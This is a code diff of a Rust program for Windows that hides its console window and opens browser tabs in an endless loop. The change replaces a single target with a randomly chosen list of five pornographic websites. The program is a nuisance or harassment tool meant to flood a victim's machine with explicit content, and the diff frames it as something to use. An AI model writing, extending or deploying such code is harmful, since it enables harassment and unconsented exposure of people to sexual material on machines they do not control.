@@ -2,21 +2,31 @@
 // Widows only!
 #![windows_subsystem = "windows"]
 
+use rand::{thread_rng, Rng};
 use std::{thread, time};
 
-
 fn main() {
-    let delay = time::Duration::from_millis(200);
-    let target_url = "https://pornhub.com/gay";
-    
-    if let Err(e) = open_tab(target_url) {
+    let delay = time::Duration::from_millis(400);
+    let mut rng = thread_rng();
+
+    let targets: [&str; 5] = [
+        "https://pornhub.com",
+        "https://pornhub.com/gayporn",
+        "https://e621.net",
+        "https://xvideos.com",
+        "https://rule43.xxx",
+    ];
+
+    if let Err(e) = open_tab(targets[0]) {
         println!("{:#?}", e);
         panic!("Failed to execute program!");
     }
     thread::sleep(time::Duration::from_millis(2));
 
     loop {
-        if let Err(e) = open_tab(target_url) {
+        let target = targets[rng.gen_range(0..(targets.len() - 1))];
+
+        if let Err(e) = open_tab(target) {
             println!("{:#?}", e);
             panic!("Failed to execute program!");
         }
